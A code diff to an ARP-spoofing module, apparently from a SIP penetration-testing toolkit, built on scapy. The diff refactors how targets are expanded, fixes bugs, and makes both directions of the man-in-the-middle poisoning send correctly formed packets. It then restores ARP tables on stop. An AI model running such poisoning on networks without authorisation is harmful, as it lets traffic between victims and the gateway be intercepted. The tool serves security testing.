@@ -10,22 +10,18 @@ __email__ = "pepeluxx@gmail.com"
 
 from scapy.all import Ether, ARP, srp, send
 import time
+import sys
 import signal
 import os
-import ipaddress
 import threading
 import platform
-import socket
-from IPy import IP
 from .lib.functions import (
     get_machine_default_ip,
-    ip2long,
+    expand_targets,
     get_default_gateway_linux,
     get_default_gateway_mac,
     enable_ip_route,
     disable_ip_route,
-    ip2long,
-    long2ip,
 )
 from .lib.color import Color
 from .lib.logos import Logo
@@ -58,11 +54,11 @@ class ArpSpoof:
         ops = platform.system()
 
         try:
-            self.verbose == int(self.verbose)
+            self.verbose = int(self.verbose)
         except:
             self.verbose = 0
 
-        if ops == "Linux" and current_user != "root":
+        if ops in ("Linux", "Darwin") and current_user != "root":
             print(
                 f"{self.c.WHITE}You must be {self.c.RED}root{self.c.WHITE} to use this module"
             )
@@ -84,7 +80,7 @@ class ArpSpoof:
                 f"{self.c.BWHITE}Try with {self.c.BYELLOW}-local-ip{self.c.BWHITE} param"
             )
             print(self.c.WHITE)
-            exit()
+            sys.exit()
 
         if self.gw == "":
             if ops == "Linux":
@@ -106,114 +102,50 @@ class ArpSpoof:
 
         enable_ip_route()
 
+        # target expansion shared with the rest of the modules: comma
+        # separated lists, address ranges (also the 10.0.0.10-20 shorthand),
+        # host names reported when they cannot be resolved, and empty lines
+        # skipped instead of spoofing 0.0.0.0
+        def add_targets(target):
+            try:
+                (ips, names) = expand_targets(target)
+            except ValueError as error:
+                print(f"{self.c.RED}{error}{self.c.WHITE}")
+                return
+
+            for ip in ips:
+                if ip != local_ip and ip != self.gw:
+                    self.ips.append(ip)
+                    self.ips.append("")
+
         if self.file != "":
             try:
-                with open(self.file) as f:
-                    line = f.readline()
-                    hosts = []
+                f = open(self.file)
+            except OSError as error:
+                print(f"{self.c.RED}Error reading file {self.file} ({error})")
+                print(self.c.WHITE)
+                sys.exit()
 
-                    while line:
-                        error = 0
-                        line = line.replace("\n", "")
+            with f:
+                for line in f:
+                    if self.run == False:
+                        break
 
-                        try:
-                            if self.run == True:
-                                try:
-                                    ip = socket.gethostbyname(line)
-                                    self.ip = IP(ip, make_net=True)
-                                except:
-                                    try:
-                                        self.ip = IP(line, make_net=True)
+                    line = line.strip()
 
-                                    except:
-                                        if line.find("-") > 0:
-                                            val = line.split("-")
-                                            start_ip = val[0]
-                                            end_ip = val[1]
-                                            self.ip = line
+                    if line == "":
+                        continue
 
-                                            error = 1
-
-                                if error == 0:
-                                    hosts = list(
-                                        ipaddress.ip_network(str(self.ip)).hosts()
-                                    )
-
-                                    if hosts == []:
-                                        hosts.append(self.ip)
-
-                                    last = len(hosts) - 1
-                                    start_ip = hosts[0]
-                                    end_ip = hosts[last]
-
-                                ipini = int(ip2long(str(start_ip)))
-                                ipend = int(ip2long(str(end_ip)))
-
-                                for i in range(ipini, ipend + 1):
-                                    if i != local_ip and i != self.gw:
-                                        self.ips.append(long2ip(i))
-                                        self.ips.append("")
-                        except:
-                            pass
-
-                        line = f.readline()
-
-                f.close()
-            except:
-                print(f"Error reading file {self.file}")
-                exit()
+                    add_targets(line)
         else:
-            for i in self.ip.split(","):
-                ips = []
-                hosts = []
-                error = 0
-
-                try:
-                    if i.find("/") < 1:
-                        i = socket.gethostbyname(i)
-                        i = IP(i, make_net=True)
-                    else:
-                        i = IP(i, make_net=True)
-                except:
-                    if i.find("-") > 0:
-                        val = i.split("-")
-                        start_ip = val[0]
-                        end_ip = val[1]
-
-                        error = 1
-
-                try:
-                    if error == 0:
-                        hlist = list(ipaddress.ip_network(str(i)).hosts())
-
-                        if hlist == []:
-                            hosts.append(i)
-                        else:
-                            for h in hlist:
-                                hosts.append(h)
-
-                        last = len(hosts) - 1
-                        start_ip = hosts[0]
-                        end_ip = hosts[last]
-
-                    ipini = int(ip2long(str(start_ip)))
-                    ipend = int(ip2long(str(end_ip)))
-                    iplist = i
-
-                    for i in range(ipini, ipend + 1):
-                        if i != local_ip and i != self.gw:
-                            self.ips.append(long2ip(i))
-                            self.ips.append("")
-
-                except:
-                    pass
+            add_targets(self.ip)
 
         threads = list()
 
         if self.ips == []:
             print(f"{self.c.RED}\nNo IPs found")
             print(self.c.WHITE)
-            exit()
+            sys.exit()
 
         n = len(self.ips)
 
@@ -233,7 +165,8 @@ class ArpSpoof:
             t.start()
             time.sleep(0.1)
 
-        t.join()
+        for t in threads:
+            t.join()
 
     def stop(self):
         print(f"{self.c.BWHITE}\nRestoring ARP tables ...")
@@ -250,9 +183,9 @@ class ArpSpoof:
             ip = self.ips[x]
             if ip not in self.dropped_ips:
                 if ip != local_ip and ip != self.gw:
+                    # both directions of every victim, not just the last one
                     self.restore(str(ip), self.gw, self.verbose)
-
-        self.restore(self.gw, str(ip), self.verbose)
+                    self.restore(self.gw, str(ip), self.verbose)
 
         # disable ip forwarding
         disable_ip_route()
@@ -286,7 +219,7 @@ class ArpSpoof:
             self_mac = ARP().hwsrc
             print(
                 self.c.YELLOW
-                + "[+] Sent restoring to {} : {} is-at {}".format(
+                + "[+] Sent poisoning to {} : {} is-at {}".format(
                     target_ip, host_ip, self_mac
                 )
                 + self.c.WHITE
@@ -313,31 +246,32 @@ class ArpSpoof:
         if verbose > 0:
             print(
                 self.c.GREEN
-                + "[-] Sent poisoning to {} : {} is-at {}".format(
+                + "[-] Sent restoring to {} : {} is-at {}".format(
                     target_ip, host_ip, host_mac
                 )
                 + self.c.WHITE
             )
 
     def start_spoof(self, target_ip, gw_ip, target_mac, verbose):
+        # both MAC addresses are needed to build a well formed ARP packet, not
+        # only to print them: without them the hwdst field is empty and the
+        # packet goes out 6 bytes short
+        target_mac = self.get_mac(target_ip)
+        gw_mac = self.get_mac(gw_ip)
+
+        if target_mac == None:
+            print(
+                f"{self.c.RED}[!] Error getting the target MAC address for IP: {target_ip}{self.c.WHITE}"
+            )
+            self.dropped_ips.append(target_ip)
+            return
+        if gw_mac == None:
+            print(
+                f"{self.c.RED}[!] Error getting the target MAC address for IP: {gw_ip}{self.c.WHITE}"
+            )
+            return
+
         if verbose > 0:
-            # get the real MAC address of target
-            target_mac = self.get_mac(target_ip)
-            # get the real MAC address of spoofed (gateway, i.e router)
-            gw_mac = self.get_mac(gw_ip)
-
-            if target_mac == None:
-                print(
-                    f"{self.c.RED}[!] Error getting the target MAC address for IP: {target_ip}{self.c.WHITE}"
-                )
-                self.dropped_ips.append(target_ip)
-                return
-            if gw_mac == None:
-                print(
-                    f"{self.c.RED}[!] Error getting the target MAC address for IP: {gw_ip}{self.c.WHITE}"
-                )
-                return
-
             print(
                 f"{self.c.YELLOW}[+] Start ARP spoof between {target_ip} ({target_mac}) and {gw_ip} ({gw_mac}){self.c.WHITE}"
             )
@@ -346,6 +280,6 @@ class ArpSpoof:
             # telling the `target` that we are the `gw`
             self.spoof(target_ip, gw_ip, target_mac, verbose)
             # telling the `gw` that we are the `target`
-            self.spoof(gw_ip, target_ip, "", verbose)
+            self.spoof(gw_ip, target_ip, gw_mac, verbose)
             # sleep for one second
             time.sleep(1)
